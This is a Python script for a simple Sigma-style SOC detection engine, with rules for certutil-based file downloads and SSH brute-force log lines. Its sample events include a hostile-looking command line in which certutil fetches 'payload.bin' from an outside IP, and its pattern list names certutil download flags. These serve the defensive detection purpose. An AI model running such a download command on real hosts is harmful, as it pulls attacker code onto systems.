#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOC & SIEM Sigma Detection Engine
Author: Toprak Ahmet Aydoğmuş
"""

import json
import re
from typing import Dict, List, Any

class SigmaRule:
    def __init__(self, title: str, rule_id: str, severity: str, mitre_tag: str, match_field: str, patterns: List[str]):
        self.title = title
        self.rule_id = rule_id
        self.severity = severity
        self.mitre_tag = mitre_tag
        self.match_field = match_field
        self.patterns = patterns

    def evaluate(self, event: Dict[str, Any]) -> bool:
        val = str(event.get(self.match_field, ""))
        for pattern in self.patterns:
            if pattern.lower() in val.lower():
                return True
        return False

class DetectionPipeline:
    def __init__(self):
        self.rules: List[SigmaRule] = []

    def register_rule(self, rule: SigmaRule):
        self.rules.append(rule)

    def process_event(self, event: Dict[str, Any]) -> List[Dict[str, Any]]:
        alerts = []
        for rule in self.rules:
            if rule.evaluate(event):
                alert = {
                    "alert_id": f"ALT-{rule.rule_id[:8]}",
                    "rule_title": rule.title,
                    "severity": rule.severity,
                    "mitre_technique": rule.mitre_tag,
                    "source_event": event
                }
                alerts.append(alert)
        return alerts

def init_pipeline() -> DetectionPipeline:
    pipeline = DetectionPipeline()
    # Rule 1: LOLBAS Certutil Download
    pipeline.register_rule(SigmaRule(
        title="Suspicious Certutil Ingress Tool Transfer",
        rule_id="a1928471-bcde-4123-8899-0123456789ab",
        severity="HIGH",
        mitre_tag="T1105",
        match_field="command_line",
        patterns=["certutil -urlcache", "certutil.exe -urlcache", "-split -f"]
    ))
    # Rule 2: SSH Brute Force
    pipeline.register_rule(SigmaRule(
        title="Repeated SSH Authentication Failure",
        rule_id="b8273645-cdef-4234-9900-1234567890bc",
        severity="MEDIUM",
        mitre_tag="T1110",
        match_field="message",
        patterns=["Failed password for invalid user", "Failed password for root"]
    ))
    return pipeline

if __name__ == "__main__":
    pipeline = init_pipeline()
    sample_events = [
        {"event_id": 1, "host": "srv-app01", "command_line": "certutil.exe -urlcache -split -f http://198.51.100.23/payload.bin", "user": "SYSTEM"},
        {"event_id": 2, "host": "srv-web01", "message": "Failed password for invalid user admin from 192.0.2.88 port 44321 ssh2", "service": "sshd"},
        {"event_id": 3, "host": "srv-db01", "command_line": "systemctl status postgresql", "user": "postgres"}
    ]

    print("[*] Processing Telemetry Stream...")
    for ev in sample_events:
        results = pipeline.process_event(ev)
        if results:
            for alt in results:
                print(f"[!] ALERT: [{alt['severity']}] {alt['rule_title']} (MITRE: {alt['mitre_technique']}) on {alt['source_event']['host']}")
        else:
            print(f"[+] Event {ev['event_id']} passed normal baseline.")
